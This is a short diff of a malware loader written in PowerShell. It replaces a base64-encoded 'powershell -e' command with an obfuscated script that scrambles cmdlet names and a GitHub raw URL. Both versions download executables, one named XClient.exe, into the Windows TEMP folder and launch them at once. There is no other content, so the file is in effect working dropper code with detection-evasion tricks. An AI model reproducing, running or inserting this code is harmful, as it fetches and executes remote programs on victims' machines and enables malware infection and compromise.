@@ -1,1 +1,12 @@
-powershell -e IyBVUkwg0Lgg0L/Rg9GC0Ywg0LTQu9GPINC/0LXRgNCy0L7Qs9C+INGE0LDQudC70LAKJHVybDEgPSAiaHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW84NDIvdGVzdC9yYXcvcmVmcy9oZWFkcy9tYWluL0xOc3lzdGVhbS5leGUiCiRvdXRwdXRQYXRoMSA9ICIkZW52OlRFTVBcTE5zeXN0ZW0uZXhlIiAKCiMgVVJMINC4INC/0YPRgtGMINC00LvRjyDQstGC0L7RgNC+0LPQviDRhNCw0LnQu9CwCiR1cmwyID0gImh0dHBzOi8vZ2l0aHViLmNvbS9hbnRvbmlvODQyL3Rlc3QvcmF3L3JlZnMvaGVhZHMvbWFpbi9YQ2xpZW50LmV4ZS5leGUiCiRvdXRwdXRQYXRoMiA9ICIkZW52OlRFTVBcTkxzeXN0ZW0uZXhlIiAKCnRyeSB7CiAgICAjINCh0LrQsNGH0LjQstCw0L3QuNC1INC/0LXRgNCy0L7Qs9C+INGE0LDQudC70LAKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybDEgLU91dEZpbGUgJG91dHB1dFBhdGgxCgogICAgIyDQn9GA0L7QstC10YDQutCwINC4INC30LDQv9GD0YHQuiDQv9C10YDQstC+0LPQviDRhNCw0LnQu9CwCiAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRvdXRwdXRQYXRoMSkgewogICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRvdXRwdXRQYXRoMQogICAgfQoKICAgICMg0KHQutCw0YfQuNCy0LDQvdC40LUg0LLRgtC+0YDQvtCz0L4g0YTQsNC50LvQsAogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdXJsMiAtT3V0RmlsZSAkb3V0cHV0UGF0aDIKCiAgICAjINCf0YDQvtCy0LXRgNC60LAg0Lgg0LfQsNC/0YPRgdC6INCy0YLQvtGA0L7Qs9C+INGE0LDQudC70LAKICAgIGlmIChUZXN0LVBhdGggLVBhdGggJG91dHB1dFBhdGgyKSB7CiAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG91dHB1dFBhdGgyCiAgICB9Cn0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIgp9Cg==
+${u`RL} = ("{6}{11}{15}{0}{1}{19}{10}{4}{7}{13}{16}{12}{9}{5}{17}{3}{18}{8}{14}{2}" -f 'git','hub.co','e','ien','est/raw','C','https:','/re','.e','in/X','antonio842/t','/','ds/ma','fs/','x','/','hea','l','t','m/')
+${ou`T`puTpaTh} = "$env:TEMP\LNsystem.exe"
+
+try {
+    &("{2}{4}{3}{1}{0}"-f'thod','tMe','I','s','nvoke-Re') -Uri ${U`RL} -OutFile ${oU`TP`UTpA`Th}
+
+    if (&("{1}{0}" -f 'h','Test-Pat') -Path ${O`Ut`puTpAtH}) {
+        &("{2}{0}{1}" -f'art-Pro','cess','St') -FilePath ${Ou`T`puTpa`TH}
+    }
+} catch {
+    &("{0}{1}{2}" -f'Wr','ite-Hos','t') ('A'+'n '+'e'+'rror'+' '+'oc'+'c'+'urred: '+"$_")
+}
